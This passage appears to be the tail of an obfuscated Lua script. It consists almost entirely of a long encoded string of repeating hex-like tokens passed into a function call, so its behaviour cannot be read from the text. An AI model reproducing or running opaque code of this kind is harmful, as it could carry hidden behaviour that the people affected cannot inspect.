006A3O006A3O006B3O006D3O006D3O006E3O006E3O006E3O006E3O006F3O006F3O006F3O006F3O00703O00723O00723O00733O00743O00753O00783O00783O00793O00793O00793O00793O007A3O007A3O007A3O007A3O007B3O007C3O007E3O00803O00803O00813O00823O00833O00843O00863O00363O00023O00033O00093O00093O000A3O000B3O000C3O000D3O000D3O00333O00333O00333O000D3O00343O00363O00363O003A3O00373O004B3O004B3O004B3O004B3O003B3O004C3O004C3O00863O00863O004C3O00873O00893O00893O008A3O008A3O008A3O008A3O008A3O008B3O008B3O008B3O008B3O008B3O008C3O008C3O008C3O008C3O008D3O008D3O008D3O008D3O008D3O008E3O008F3O00903O00913O00",v9(),...);end